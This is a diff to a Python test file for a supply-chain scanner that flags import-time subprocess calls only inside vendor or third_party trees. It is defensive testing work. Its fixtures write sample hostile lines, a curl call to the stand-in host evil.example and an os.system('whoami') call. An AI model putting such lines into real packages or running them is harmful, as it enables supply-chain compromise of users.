@@ -8,6 +8,14 @@ from packages.sca.supply_chain.python_imports import scan_target
 
 
 def _write(p: Path, body: str) -> None:
+    """Write ``body`` to ``p``. Tests use a ``vendor/`` subdir so the
+    detector's scope filter (only fires on third-party / vendored
+    code, not operator code) is satisfied — without that, every
+    test would write to ``tmp_path`` directly and the detector
+    would skip them all because they look like operator code."""
+    if not any(part in {"vendor", "_vendor", "third_party",
+                         "thirdparty", "external"} for part in p.parts):
+        p = p.parent / "vendor" / p.name
     p.parent.mkdir(parents=True, exist_ok=True)
     p.write_text(body, encoding="utf-8")
 
@@ -177,3 +185,58 @@ import logging
 logging.basicConfig(level=logging.INFO)
 """)
     assert scan_target(tmp_path, []) == []
+
+
+# ---------------------------------------------------------------------------
+# Scope filter — only fires inside vendor trees, never on operator code
+# ---------------------------------------------------------------------------
+
+
+def test_operator_code_outside_vendor_not_flagged(tmp_path: Path) -> None:
+    """A top-level subprocess.run() in operator-written code (i.e.
+    NOT inside a vendor tree) is benign hygiene, not a supply-chain
+    risk. The detector must skip it — operator code is trusted, the
+    heuristic is for third-party content only.
+
+    Without this guard, scanning a project that does anything at
+    import time (config loading, env var reads, cpu count detection)
+    drowns the report in false positives."""
+    # Write directly to tmp_path, bypassing the _write helper's
+    # vendor/ rerouting.
+    p = tmp_path / "app.py"
+    p.write_text(
+        "import subprocess\n"
+        "subprocess.run(['echo', 'hi'])\n",
+        encoding="utf-8",
+    )
+    findings = scan_target(tmp_path, [])
+    assert findings == [], (
+        "operator code (no vendor/ ancestor) must NOT fire the "
+        "supply-chain heuristic"
+    )
+
+
+def test_vendor_tree_code_still_fires(tmp_path: Path) -> None:
+    """Companion to the above: code under a recognised vendor tree
+    DOES fire. Defends the inverse case — without this we'd
+    accidentally disable the detector entirely."""
+    (tmp_path / "vendor").mkdir()
+    p = tmp_path / "vendor" / "evil.py"
+    p.write_text(
+        "import subprocess\n"
+        "subprocess.run(['curl', 'https://evil.example/x'])\n",
+        encoding="utf-8",
+    )
+    findings = scan_target(tmp_path, [])
+    assert len(findings) == 1
+
+
+def test_third_party_alias_also_recognised(tmp_path: Path) -> None:
+    """``third_party/`` is the alternate vendor convention (Go-style,
+    used by some Python projects too). Same scope behaviour as
+    ``vendor/``."""
+    (tmp_path / "third_party" / "lib").mkdir(parents=True)
+    p = tmp_path / "third_party" / "lib" / "init.py"
+    p.write_text("import os\nos.system('whoami')\n", encoding="utf-8")
+    findings = scan_target(tmp_path, [])
+    assert any("os.system" in f.detail for f in findings)
